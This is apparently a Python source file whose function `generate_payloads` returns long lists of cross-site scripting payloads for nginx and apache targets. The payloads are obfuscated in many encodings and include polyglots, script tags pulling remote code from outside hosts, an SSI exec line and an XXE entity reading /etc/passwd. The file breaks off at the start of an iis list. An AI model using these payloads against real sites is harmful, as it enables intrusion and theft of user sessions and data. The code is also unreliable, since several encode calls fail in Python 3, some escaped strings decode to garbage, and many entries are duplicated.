def generate_payloads(server_type='generic'):
    if server_type == 'nginx':
        return [
        # Hexadecimal escape sequences
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E',
        '\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x78\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x65\x76\x61\x6C\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x39\x37\x2C\x31\x30\x30\x2C\x31\x31\x30\x2C\x31\x32\x31\x2C\x31\x31\x35\x2C\x31\x31\x34\x2C\x34\x30\x2C\x34\x30\x2C\x49\x54\x45\x29\x29\x3E',
        '\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x22\x3E\x43\x6C\x69\x63\x6B\x20\x4D\x65\x3C\x2F\x61\x3E',
        # Unicode escape sequences
        '\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E',
        '\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0039\u0037\u002C\u0031\u0030\u0030\u002C\u0031\u0031\u0030\u002C\u0031\u0032\u0031\u002C\u0031\u0031\u0035\u002C\u0031\u0031\u0034\u002C\u0034\u0030\u002C\u0034\u0030\u002C\u0049\u0054\u0045\u0029\u0029\u003E',
        '\u003C\u0061\u0020\u0068\u0072\u0065\u0066\u003D\u0022\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003E\u0043\u006C\u0069\u0063\u006B\u0020\u004D\u0065\u003C\u002F\u0061\u003E',
        # Base64 encoding
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'PGltZyBzcmM9eCBvbmVycm9yPWV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSg5NywxMDAsMTEwLDExMSwxMTUsMTE0LDQwLDQwLElURSkpPg==',
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+',
        # UTF-16 encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e',
        '\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0039\u0037\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0030\u002c\u0031\u0032\u0031\u002c\u0031\u0031\u0035\u002c\u0031\u0031\u0034\u002c\u0034\u0030\u002c\u0034\u0030\u002c\u0049\u0054\u0045\u0029\u0029\u003e',
        '\u003c\u0061\u0020\u0068\u0072\u0065\u0066\u003d\u0022\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003e\u0043\u006c\u0069\u0063\u006b\u0020\u004d\u0065\u003c\u002f\u0061\u003e',
        # ROT13 encoding
        '<script>alert("XSS")</script>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<a href="javascript:alert(\'XSS\')">Click Me</a>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        # Percent-encoded characters
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E',
        '%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E',
        # HTML entity references
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;',
        '&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click Me&lt;/a&gt;',
        # Combination of techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-16le').decode('utf-16le'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('rot13'),
        # Uppercase
        '<SCRIPT>ALERT("XSS")</SCRIPT>',
        # Lowercase
        '<script>alert("xss")</script>',
        # Swap case
        '<SCRIPT>ALERT("xss")</SCRIPT>'.swapcase(),
        # Reverse payload
        '<script>alert("XSS")</script>'[::-1],
        # More obfuscation techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'.replace('a', '\x00a').replace('l', '\x00c'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '\u003Cscript\u003Ealert(\u0022XSS\u0022)\u003C/script\u003E'.replace('a', '\x00a').replace('l', '\x00c'),
        # UTF-32LE encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-32le').decode('utf-32le'),
        # More parameter pollution
        '<script src="http://example.com/xss.js?param1=value1&param2=value2&param3=value3"></script>',
        # More obfuscation combinations
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('utf-32').decode('utf-32'),
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+'.encode('rot13').decode('rot13'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.encode('base64').decode('base64'),
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    elif server_type == 'apache':
        return [        # Hexadecimal escape sequences
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E',
        '\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x78\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x65\x76\x61\x6C\x28\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x39\x37\x2C\x31\x30\x30\x2C\x31\x31\x30\x2C\x31\x32\x31\x2C\x31\x31\x35\x2C\x31\x31\x34\x2C\x34\x30\x2C\x34\x30\x2C\x49\x54\x45\x29\x29\x3E',
        '\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x22\x3E\x43\x6C\x69\x63\x6B\x20\x4D\x65\x3C\x2F\x61\x3E',
        # Unicode escape sequences
        '\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u0061\u006C\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E',
        '\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0039\u0037\u002C\u0031\u0030\u0030\u002C\u0031\u0031\u0030\u002C\u0031\u0032\u0031\u002C\u0031\u0031\u0035\u002C\u0031\u0031\u0034\u002C\u0034\u0030\u002C\u0034\u0030\u002C\u0049\u0054\u0045\u0029\u0029\u003E',
        '\u003C\u0061\u0020\u0068\u0072\u0065\u0066\u003D\u0022\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003E\u0043\u006C\u0069\u0063\u006B\u0020\u004D\u0065\u003C\u002F\u0061\u003E',
        # Base64 encoding
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
        'PGltZyBzcmM9eCBvbmVycm9yPWV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSg5NywxMDAsMTEwLDExMSwxMTUsMTE0LDQwLDQwLElURSkpPg==',
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+',
        # UTF-16 encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e',
        '\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0039\u0037\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0030\u002c\u0031\u0032\u0031\u002c\u0031\u0031\u0035\u002c\u0031\u0031\u0034\u002c\u0034\u0030\u002c\u0034\u0030\u002c\u0049\u0054\u0045\u0029\u0029\u003e',
        '\u003c\u0061\u0020\u0068\u0072\u0065\u0066\u003d\u0022\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029\u0022\u003e\u0043\u006c\u0069\u0063\u006b\u0020\u004d\u0065\u003c\u002f\u0061\u003e',
        # ROT13 encoding
        '<script>alert("XSS")</script>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        '<a href="javascript:alert(\'XSS\')">Click Me</a>'.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
        # Percent-encoded characters
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        '%3Cimg%20src%3Dx%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E',
        '%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E',
        # HTML entity references
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;',
        '&lt;a href=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;Click Me&lt;/a&gt;',
        # Combination of techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-16le').decode('utf-16le'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('rot13'),
        # Uppercase
        '<SCRIPT>ALERT("XSS")</SCRIPT>',
        # Lowercase
        '<script>alert("xss")</script>',
        # Swap case
        '<SCRIPT>ALERT("xss")</SCRIPT>'.swapcase(),
        # Reverse payload
        '<script>alert("XSS")</script>'[::-1],
        # More obfuscation techniques
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'.replace('a', '\x00a').replace('l', '\x00c'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.replace('a', '\x00a').replace('l', '\x00c'),
        '\u003Cscript\u003Ealert(\u0022XSS\u0022)\u003C/script\u003E'.replace('a', '\x00a').replace('l', '\x00c'),
        # UTF-32LE encoding
        '\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0058\u0053\u0053\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e'.encode('utf-32le').decode('utf-32le'),
        # More parameter pollution
        '<script src="http://example.com/xss.js?param1=value1&param2=value2&param3=value3"></script>',
        # More obfuscation combinations
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E'.encode('utf-16').decode('utf-16'),
        'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='.encode('utf-32').decode('utf-32'),
        'PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnWFNTJyk+Q2xpY2sgTWU8L2E+'.encode('rot13').decode('rot13'),
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'.encode('base64').decode('base64'),
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '"><img src="x" onerror="alert(\'XSS\')" />',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # ... (previous payloads)
        '<img src=x onerror=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        # XSS Locator (Polygot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
    elif server_type == 'iis':
        return [        # Hexadecimal escape sequences
        '\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E',
